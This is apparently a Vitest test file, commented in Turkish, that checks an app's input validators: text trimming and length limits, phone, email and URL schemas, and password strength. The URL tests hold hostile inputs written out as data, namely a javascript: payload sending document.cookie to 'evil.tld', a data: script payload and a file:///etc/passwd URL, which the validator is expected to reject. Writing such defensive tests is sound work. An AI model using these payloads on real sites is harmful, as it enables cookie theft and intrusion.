import { describe, it, expect } from 'vitest';
import {
  requiredText,
  optionalText,
  phoneSchema,
  emailSchema,
  httpUrlSchema,
  LIMITS,
} from '../../src/utils/validation.js';

/**
 * Girdi doğrulama kuralları.
 *
 * En sinsi hata `z.string().min(1)`'in "zorunlu alan" sanılmasıydı: boşluk-only
 * ve tek karakterlik değerleri kabul ediyor, yani konu alanı `"   "` ile
 * geçilebiliyordu. Kırpma doğrulamadan ÖNCE yapılmalı.
 *
 * İkincisi: kalıcı yazılan metinlerin üst sınırı yoktu. Prisma `String` =
 * Postgres `TEXT`, DB hiçbir uzunluk zorlamıyor; tek backstop Fastify'ın 1 MB
 * gövde limitiydi ve o da alan başına değil istek başına.
 */

describe('requiredText', () => {
  const subject = requiredText({ ...LIMITS.ticketSubject, label: 'Konu' });

  it('boşluk-only değeri REDDEDER', () => {
    // Regresyon: min(1) bunu kabul ediyordu.
    expect(subject.safeParse('   ').success).toBe(false);
    expect(subject.safeParse('\n\t\n').success).toBe(false);
    expect(subject.safeParse('').success).toBe(false);
  });

  it('anlamsız kısa değeri reddeder', () => {
    expect(subject.safeParse('a').success).toBe(false);
    expect(subject.safeParse('.').success).toBe(false);
  });

  it('gerçek konuyu kabul eder ve kırpar', () => {
    const r = subject.safeParse('  Yazıcı çalışmıyor  ');
    expect(r.success).toBe(true);
    if (r.success) expect(r.data).toBe('Yazıcı çalışmıyor');
  });

  it('üst sınırı zorlar', () => {
    expect(subject.safeParse('x'.repeat(200)).success).toBe(true);
    expect(subject.safeParse('x'.repeat(201)).success).toBe(false);
  });

  it('alt sınırı KIRPILMIŞ uzunluk üzerinden ölçer', () => {
    // 3 karakter + boşluk → kırpınca 3 → min 5'in altında.
    expect(subject.safeParse('abc      ').success).toBe(false);
  });

  it('hata mesajı Türkçe ve alan adını içerir', () => {
    const r = subject.safeParse('a');
    expect(r.success).toBe(false);
    if (!r.success) expect(r.error.issues[0].message).toContain('Konu');
  });
});

describe('optionalText', () => {
  const dept = optionalText({ ...LIMITS.shortLabel, label: 'Departman' });

  it('boş stringi undefined yapar (DB\'ye boş yazılmasın)', () => {
    const r = dept.safeParse('   ');
    expect(r.success).toBe(true);
    if (r.success) expect(r.data).toBeUndefined();
  });

  it('değeri kırpar', () => {
    const r = dept.safeParse('  Muhasebe  ');
    if (r.success) expect(r.data).toBe('Muhasebe');
  });

  it('üst sınırı zorlar', () => {
    expect(dept.safeParse('x'.repeat(101)).success).toBe(false);
  });
});

describe('phoneSchema', () => {
  it('yaygın TR biçimlerini kabul eder', () => {
    for (const v of ['05321234567', '+90 532 123 45 67', '(0212) 555-1234']) {
      expect(phoneSchema.safeParse(v).success).toBe(true);
    }
  });

  it('harf içeren değeri reddeder', () => {
    expect(phoneSchema.safeParse('bilinmiyor').success).toBe(false);
    expect(phoneSchema.safeParse('0532 ARA BENI').success).toBe(false);
  });

  it('aşırı uzunu reddeder', () => {
    expect(phoneSchema.safeParse('1'.repeat(25)).success).toBe(false);
  });
});

describe('emailSchema', () => {
  it('küçük harfe indirir — aynı adres iki kayıt üretmesin', () => {
    const r = emailSchema.safeParse('  Ali.Veli@Firma.COM  ');
    expect(r.success).toBe(true);
    if (r.success) expect(r.data).toBe('ali.veli@firma.com');
  });

  it('geçersizi reddeder', () => {
    expect(emailSchema.safeParse('ali@').success).toBe(false);
    expect(emailSchema.safeParse('ali').success).toBe(false);
  });
});

describe('httpUrlSchema', () => {
  it('http/https kabul eder', () => {
    expect(httpUrlSchema.safeParse('https://intranet.firma.com').success).toBe(true);
    expect(httpUrlSchema.safeParse('http://10.0.0.5:8080').success).toBe(true);
  });

  it('javascript: REDDEDER (React href\'te engellemiyor)', () => {
    expect(httpUrlSchema.safeParse('javascript:alert(1)').success).toBe(false);
    expect(httpUrlSchema.safeParse("javascript:fetch('//evil.tld?c='+document.cookie)").success).toBe(false);
  });

  it('data: ve file: reddeder', () => {
    expect(httpUrlSchema.safeParse('data:text/html,<script>alert(1)</script>').success).toBe(false);
    expect(httpUrlSchema.safeParse('file:///etc/passwd').success).toBe(false);
  });

  it('boş değeri undefined yapar', () => {
    const r = httpUrlSchema.safeParse('');
    expect(r.success).toBe(true);
    if (r.success) expect(r.data).toBeUndefined();
  });
});

describe('strongPassword', () => {
  it('eski min(8) ile geçen zayıf şifreleri REDDEDER', async () => {
    const { strongPassword } = await import('../../src/utils/validation.js');
    // Bunların hepsi z.string().min(8) ile bir ADMIN hesabı için kabul ediliyordu.
    for (const v of ['password', '12345678', 'admin123', 'Sifre123']) {
      expect(strongPassword.safeParse(v).success).toBe(false);
    }
  });

  it('12 karakterden kısa olanı reddeder', async () => {
    const { strongPassword } = await import('../../src/utils/validation.js');
    expect(strongPassword.safeParse('Ab1!efghijk').success).toBe(false); // 11
    expect(strongPassword.safeParse('Ab1!efghijkl').success).toBe(true); // 12
  });

  it('tek karakter sınıfı yetmez', async () => {
    const { strongPassword } = await import('../../src/utils/validation.js');
    expect(strongPassword.safeParse('abcdefghijklmnop').success).toBe(false);
    expect(strongPassword.safeParse('123456789012345').success).toBe(false);
  });

  it('dört sınıftan üçü yeterli — sembol ZORUNLU değil', async () => {
    // Zorunlu sembol kullanıcıyı 'Sifre123!' gibi kalıplara iter.
    const { strongPassword } = await import('../../src/utils/validation.js');
    expect(strongPassword.safeParse('MerhabaDunya42').success).toBe(true);
  });

  it('yaygın şifreyi kural sağlasa bile reddeder', async () => {
    const { strongPassword } = await import('../../src/utils/validation.js');
    expect(strongPassword.safeParse('p@ssw0rd1234').success).toBe(false);
  });

  it('tek karakter tekrarını reddeder', async () => {
    const { strongPassword } = await import('../../src/utils/validation.js');
    expect(strongPassword.safeParse('aaaaaaaaaaaaaaa').success).toBe(false);
  });

  it('Türkçe karakterli güçlü şifreyi kabul eder', async () => {
    const { strongPassword } = await import('../../src/utils/validation.js');
    expect(strongPassword.safeParse('ÇiğdemÖzgür2026').success).toBe(true);
  });
});
